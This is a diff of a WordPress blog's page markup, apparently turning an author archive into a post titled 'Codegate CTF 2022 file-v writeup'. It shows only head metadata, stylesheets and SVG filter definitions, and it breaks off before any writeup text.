@@ -6,23 +6,31 @@
 	<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 	<!-- This site is optimized with the Yoast SEO plugin v18.2 - https://yoast.com/wordpress/plugins/seo/ -->
-	<title>rookie, Author at Hopeless blog</title>
-	<link rel="canonical" href="https://pwnblog.github.io/author/hopeless/">
+	<title>Codegate CTF 2022 file-v writeup - Hopeless blog</title>
+	<meta name="description" content="Codegate CTF 2022 file-v writeup">
+	<link rel="canonical" href="https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/">
 	<meta property="og:locale" content="en_US">
-	<meta property="og:type" content="profile">
-	<meta property="og:title" content="rookie, Author at Hopeless blog">
-	<meta property="og:url" content="https://pwnblog.github.io/author/hopeless/">
+	<meta property="og:type" content="article">
+	<meta property="og:title" content="Codegate CTF 2022 file-v writeup - Hopeless blog">
+	<meta property="og:description" content="Codegate CTF 2022 file-v writeup">
+	<meta property="og:url" content="https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/">
 	<meta property="og:site_name" content="Hopeless blog">
-	<meta property="og:image" content="https://1.gravatar.com/avatar/d540bcce576dbf3a52877ff8c50aea85?s=500&#038;d=mm&#038;r=g">
+	<meta property="article:published_time" content="2022-02-28T03:10:23+00:00">
+	<meta property="article:modified_time" content="2022-02-28T03:10:26+00:00">
+	<meta property="og:image" content="https://i.pinimg.com/originals/61/35/d0/6135d06c45b9f6cbd1b961d68c873664.jpg">
 	<meta name="twitter:card" content="summary_large_image">
-	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://pwnblog.github.io/#website","url":"https://pwnblog.github.io/","name":"Hopeless blog","description":"Pwn the life","publisher":{"@id":"https://pwnblog.github.io/#/schema/person/ec54b174962c98c5789c4f712e28bba6"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pwnblog.github.io/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ProfilePage","@id":"https://pwnblog.github.io/author/hopeless/#webpage","url":"https://pwnblog.github.io/author/hopeless/","name":"rookie, Author at Hopeless blog","isPartOf":{"@id":"https://pwnblog.github.io/#website"},"breadcrumb":{"@id":"https://pwnblog.github.io/author/hopeless/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://pwnblog.github.io/author/hopeless/"]}]},{"@type":"BreadcrumbList","@id":"https://pwnblog.github.io/author/hopeless/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://pwnblog.github.io/"},{"@type":"ListItem","position":2,"name":"Archives for rookie"}]},{"@type":["Person","Organization"],"@id":"https://pwnblog.github.io/#/schema/person/ec54b174962c98c5789c4f712e28bba6","name":"rookie","logo":{"@id":"https://pwnblog.github.io/#personlogo"},"sameAs":["https://pwnblog.github.io"],"mainEntityOfPage":{"@id":"https://pwnblog.github.io/author/hopeless/#webpage"}}]}</script>
+	<meta name="twitter:label1" content="Written by">
+	<meta name="twitter:data1" content="rookie">
+	<meta name="twitter:label2" content="Est. reading time">
+	<meta name="twitter:data2" content="5 minutes">
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://pwnblog.github.io/#website","url":"https://pwnblog.github.io/","name":"Hopeless blog","description":"Pwn the life","publisher":{"@id":"https://pwnblog.github.io/#/schema/person/ec54b174962c98c5789c4f712e28bba6"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pwnblog.github.io/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/#primaryimage","inLanguage":"en-US","url":"https://i.pinimg.com/originals/61/35/d0/6135d06c45b9f6cbd1b961d68c873664.jpg","contentUrl":"https://i.pinimg.com/originals/61/35/d0/6135d06c45b9f6cbd1b961d68c873664.jpg"},{"@type":"WebPage","@id":"https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/#webpage","url":"https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/","name":"Codegate CTF 2022 file-v writeup - Hopeless blog","isPartOf":{"@id":"https://pwnblog.github.io/#website"},"primaryImageOfPage":{"@id":"https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/#primaryimage"},"datePublished":"2022-02-28T03:10:23+00:00","dateModified":"2022-02-28T03:10:26+00:00","description":"Codegate CTF 2022 file-v writeup","breadcrumb":{"@id":"https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/"]}]},{"@type":"BreadcrumbList","@id":"https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://pwnblog.github.io/"},{"@type":"ListItem","position":2,"name":"Codegate CTF 2022 file-v writeup"}]},{"@type":"Article","@id":"https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/#article","isPartOf":{"@id":"https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/#webpage"},"author":{"@id":"https://pwnblog.github.io/#/schema/person/ec54b174962c98c5789c4f712e28bba6"},"headline":"Codegate CTF 2022 file-v writeup","datePublished":"2022-02-28T03:10:23+00:00","dateModified":"2022-02-28T03:10:26+00:00","mainEntityOfPage":{"@id":"https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/#webpage"},"wordCount":403,"commentCount":0,"publisher":{"@id":"https://pwnblog.github.io/#/schema/person/ec54b174962c98c5789c4f712e28bba6"},"image":{"@id":"https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/#primaryimage"},"thumbnailUrl":"https://i.pinimg.com/originals/61/35/d0/6135d06c45b9f6cbd1b961d68c873664.jpg","articleSection":["writeups"],"inLanguage":"en-US","potentialAction":[{"@type":"CommentAction","name":"Comment","target":["https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/#respond"]}]},{"@type":["Person","Organization"],"@id":"https://pwnblog.github.io/#/schema/person/ec54b174962c98c5789c4f712e28bba6","name":"rookie","logo":{"@id":"https://pwnblog.github.io/#personlogo"},"sameAs":["https://pwnblog.github.io"],"url":"https://pwnblog.github.io/author/hopeless/"}]}</script>
 	<!-- / Yoast SEO plugin. -->
 
 
 <link rel="dns-prefetch" href="//s.w.org">
 <link rel="alternate" type="application/rss+xml" title="Hopeless blog &raquo; Feed" href="https://pwnblog.github.io/feed/">
 <link rel="alternate" type="application/rss+xml" title="Hopeless blog &raquo; Comments Feed" href="https://pwnblog.github.io/comments/feed/">
-<link rel="alternate" type="application/rss+xml" title="Hopeless blog &raquo; Posts by rookie Feed" href="https://pwnblog.github.io/author/hopeless/feed/">
+<link rel="alternate" type="application/rss+xml" title="Hopeless blog &raquo; Codegate CTF 2022 file-v writeup Comments Feed" href="https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/feed/">
 <script>
 window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/pwnblog.github.io\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.9.1"}};
 /*! This file is auto-generated */
@@ -42,19 +50,23 @@ img.emoji {
 }</style>
 	<link rel="stylesheet" id="wp-block-library-css" href="https://pwnblog.github.io/wp-includes/css/dist/block-library/style.min.css?ver=5.9.1" media="all">
 <style id="global-styles-inline-css">body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--contrast: var(--contrast);--wp--preset--color--contrast-2: var(--contrast-2);--wp--preset--color--contrast-3: var(--contrast-3);--wp--preset--color--base: var(--base);--wp--preset--color--base-2: var(--base-2);--wp--preset--color--base-3: var(--base-3);--wp--preset--color--accent: var(--accent);--wp--preset--color--global-color-8: var(--global-color-8);--wp--preset--color--global-color-9: var(--global-color-9);--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}</style>
+<link rel="stylesheet" id="generate-comments-css" href="https://pwnblog.github.io/wp-content/themes/generatepress/assets/css/components/comments.min.css?ver=3.1.3" media="all">
 <link rel="stylesheet" id="generate-style-css" href="https://pwnblog.github.io/wp-content/themes/generatepress/assets/css/main.min.css?ver=3.1.3" media="all">
 <style id="generate-style-inline-css">body{background-color:var(--global-color-8);color:var(--contrast);}a{color:var(--accent);}a{text-decoration:underline;}.entry-title a, .site-branding a, a.button, .wp-block-button__link, .main-navigation a{text-decoration:none;}a:hover, a:focus, a:active{color:var(--contrast);}.wp-block-group__inner-container{max-width:1200px;margin-left:auto;margin-right:auto;}:root{--contrast:#222222;--contrast-2:#575760;--contrast-3:#b2b2be;--base:#f0f0f0;--base-2:#f7f8f9;--base-3:#ffffff;--accent:#1e73be;--global-color-8:#e6e5fc;--global-color-9:#8da690;}.has-contrast-color{color:#222222;}.has-contrast-background-color{background-color:#222222;}.has-contrast-2-color{color:#575760;}.has-contrast-2-background-color{background-color:#575760;}.has-contrast-3-color{color:#b2b2be;}.has-contrast-3-background-color{background-color:#b2b2be;}.has-base-color{color:#f0f0f0;}.has-base-background-color{background-color:#f0f0f0;}.has-base-2-color{color:#f7f8f9;}.has-base-2-background-color{background-color:#f7f8f9;}.has-base-3-color{color:#ffffff;}.has-base-3-background-color{background-color:#ffffff;}.has-accent-color{color:#1e73be;}.has-accent-background-color{background-color:#1e73be;}.has-global-color-8-color{color:#e6e5fc;}.has-global-color-8-background-color{background-color:#e6e5fc;}.has-global-color-9-color{color:#8da690;}.has-global-color-9-background-color{background-color:#8da690;}.top-bar{background-color:#636363;color:#ffffff;}.top-bar a{color:#ffffff;}.top-bar a:hover{color:#303030;}.site-header{background-color:var(--global-color-8);}.main-title a,.main-title a:hover{color:var(--contrast);}.site-description{color:var(--contrast-2);}.main-navigation,.main-navigation ul ul{background-color:var(--global-color-9);}.main-navigation .main-nav ul li a, .main-navigation .menu-toggle, .main-navigation .menu-bar-items{color:var(--contrast);}.main-navigation .main-nav ul li:not([class*="current-menu-"]):hover > a, .main-navigation .main-nav ul li:not([class*="current-menu-"]):focus > a, .main-navigation .main-nav ul li.sfHover:not([class*="current-menu-"]) > a, .main-navigation .menu-bar-item:hover > a, .main-navigation .menu-bar-item.sfHover > a{color:var(--accent);}button.menu-toggle:hover,button.menu-toggle:focus{color:var(--contrast);}.main-navigation .main-nav ul li[class*="current-menu-"] > a{color:var(--accent);}.navigation-search input[type="search"],.navigation-search input[type="search"]:active, .navigation-search input[type="search"]:focus, .main-navigation .main-nav ul li.search-item.active > a, .main-navigation .menu-bar-items .search-item.active > a{color:var(--accent);}.main-navigation ul ul{background-color:var(--base);}.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .one-container .container, .separate-containers .paging-navigation, .inside-page-header{background-color:var(--global-color-9);}.entry-title a{color:var(--contrast);}.entry-title a:hover{color:var(--contrast-2);}.entry-meta{color:var(--contrast-2);}.sidebar .widget{background-color:var(--global-color-9);}.footer-widgets{background-color:var(--base-3);}.site-info{background-color:var(--base-3);}input[type="text"],input[type="email"],input[type="url"],input[type="password"],input[type="search"],input[type="tel"],input[type="number"],textarea,select{color:var(--contrast);background-color:var(--global-color-9);border-color:var(--base);}input[type="text"]:focus,input[type="email"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="number"]:focus,textarea:focus,select:focus{color:var(--contrast);background-color:var(--base-2);border-color:var(--contrast-3);}button,html input[type="button"],input[type="reset"],input[type="submit"],a.button,a.wp-block-button__link:not(.has-background){color:#ffffff;background-color:#55555e;}button:hover,html input[type="button"]:hover,input[type="reset"]:hover,input[type="submit"]:hover,a.button:hover,button:focus,html input[type="button"]:focus,input[type="reset"]:focus,input[type="submit"]:focus,a.button:focus,a.wp-block-button__link:not(.has-background):active,a.wp-block-button__link:not(.has-background):focus,a.wp-block-button__link:not(.has-background):hover{color:#ffffff;background-color:#3f4047;}a.generate-back-to-top{background-color:rgba( 0,0,0,0.4 );color:#ffffff;}a.generate-back-to-top:hover,a.generate-back-to-top:focus{background-color:rgba( 0,0,0,0.6 );color:#ffffff;}@media (max-width:768px){.main-navigation .menu-bar-item:hover > a, .main-navigation .menu-bar-item.sfHover > a{background:none;color:var(--contrast);}}.nav-below-header .main-navigation .inside-navigation.grid-container, .nav-above-header .main-navigation .inside-navigation.grid-container{padding:0px 20px 0px 20px;}.site-main .wp-block-group__inner-container{padding:40px;}.separate-containers .paging-navigation{padding-top:20px;padding-bottom:20px;}.entry-content .alignwide, body:not(.no-sidebar) .entry-content .alignfull{margin-left:-40px;width:calc(100% + 80px);max-width:calc(100% + 80px);}.rtl .menu-item-has-children .dropdown-menu-toggle{padding-left:20px;}.rtl .main-navigation .main-nav ul li.menu-item-has-children > a{padding-right:20px;}@media (max-width:768px){.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .separate-containers .paging-navigation, .one-container .site-content, .inside-page-header{padding:30px;}.site-main .wp-block-group__inner-container{padding:30px;}.inside-top-bar{padding-right:30px;padding-left:30px;}.inside-header{padding-right:30px;padding-left:30px;}.widget-area .widget{padding-top:30px;padding-right:30px;padding-bottom:30px;padding-left:30px;}.footer-widgets-container{padding-top:30px;padding-right:30px;padding-bottom:30px;padding-left:30px;}.inside-site-info{padding-right:30px;padding-left:30px;}.entry-content .alignwide, body:not(.no-sidebar) .entry-content .alignfull{margin-left:-30px;width:calc(100% + 60px);max-width:calc(100% + 60px);}.one-container .site-main .paging-navigation{margin-bottom:20px;}}/* End cached CSS */.is-right-sidebar{width:30%;}.is-left-sidebar{width:30%;}.site-content .content-area{width:70%;}@media (max-width:768px){.main-navigation .menu-toggle,.sidebar-nav-mobile:not(#sticky-placeholder){display:block;}.main-navigation ul,.gen-sidebar-nav,.main-navigation:not(.slideout-navigation):not(.toggled) .main-nav > ul,.has-inline-mobile-toggle #site-navigation .inside-navigation > *:not(.navigation-search):not(.main-nav){display:none;}.nav-align-right .inside-navigation,.nav-align-center .inside-navigation{justify-content:space-between;}.has-inline-mobile-toggle .mobile-menu-control-wrapper{display:flex;flex-wrap:wrap;}.has-inline-mobile-toggle .inside-header{flex-direction:row;text-align:left;flex-wrap:wrap;}.has-inline-mobile-toggle .header-widget,.has-inline-mobile-toggle #site-navigation{flex-basis:100%;}.nav-float-left .has-inline-mobile-toggle #site-navigation{order:10;}}</style>
 <link rel="stylesheet" id="hcb-style-css" href="https://pwnblog.github.io/wp-content/plugins/highlighting-code-block//build/css/hcb_style.css?ver=1.5.5" media="all">
 <style id="hcb-style-inline-css">:root{--hcb-font-size: 14px}:root{--hcb-font-size--mobile: 13px}:root{--hcb-font-family:Menlo, Consolas, "Hiragino Kaku Gothic ProN", "Hiragino Sans", Meiryo, sans-serif;}</style>
 <link rel="stylesheet" id="hcb-coloring-css" href="https://pwnblog.github.io/wp-content/plugins/highlighting-code-block//build/css/coloring_light.css?ver=1.5.5" media="all">
 <link rel="https://api.w.org/" href="https://pwnblog.github.io/wp-json/">
-<link rel="alternate" type="application/json" href="https://pwnblog.github.io/wp-json/wp/v2/users/1">
+<link rel="alternate" type="application/json" href="https://pwnblog.github.io/wp-json/wp/v2/posts/101">
 <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://pwnblog.github.io/xmlrpc.php?rsd">
 <link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://pwnblog.github.io/wp-includes/wlwmanifest.xml"> 
 <meta name="generator" content="WordPress 5.9.1">
+<link rel="shortlink" href="https://pwnblog.github.io/?p=101">
+<link rel="alternate" type="application/json+oembed" href="https://pwnblog.github.io/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpwnblog.github.io%2F2022%2F02%2F28%2Fcodegate-ctf-2022-file-v-writeup%2F">
+<link rel="alternate" type="text/xml+oembed" href="https://pwnblog.github.io/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpwnblog.github.io%2F2022%2F02%2F28%2Fcodegate-ctf-2022-file-v-writeup%2F&#038;format=xml">
 </head>
 
-<body class="archive author author-hopeless author-1 wp-embed-responsive right-sidebar nav-float-right separate-containers header-aligned-left dropdown-hover" itemtype="https://schema.org/Blog" itemscope>
+<body class="post-template-default single single-post postid-101 single-format-standard wp-embed-responsive right-sidebar nav-float-right separate-containers header-aligned-left dropdown-hover" itemtype="https://schema.org/Blog" itemscope>
 	<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-dark-grayscale"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0 0.49803921568627"></fefuncr><fefuncg type="table" tablevalues="0 0.49803921568627"></fefuncg><fefuncb type="table" tablevalues="0 0.49803921568627"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-grayscale"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0 1"></fefuncr><fefuncg type="table" tablevalues="0 1"></fefuncg><fefuncb type="table" tablevalues="0 1"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-yellow"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0.54901960784314 0.98823529411765"></fefuncr><fefuncg type="table" tablevalues="0 1"></fefuncg><fefuncb type="table" tablevalues="0.71764705882353 0.25490196078431"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-red"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0 1"></fefuncr><fefuncg type="table" tablevalues="0 0.27843137254902"></fefuncg><fefuncb type="table" tablevalues="0.5921568627451 0.27843137254902"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-midnight"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0 0"></fefuncr><fefuncg type="table" tablevalues="0 0.64705882352941"></fefuncg><fefuncb type="table" tablevalues="0 1"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-magenta-yellow"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0.78039215686275 1"></fefuncr><fefuncg type="table" tablevalues="0 0.94901960784314"></fefuncg><fefuncb type="table" tablevalues="0.35294117647059 0.47058823529412"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-green"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tablevalues="0.65098039215686 0.40392156862745"></fefuncr><fefuncg type="table" tablevalues="0 1"></fefuncg><fefuncb type="table" tablevalues="0.44705882352941 0.4"></fefuncb><fefunca type="table" tablevalues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter 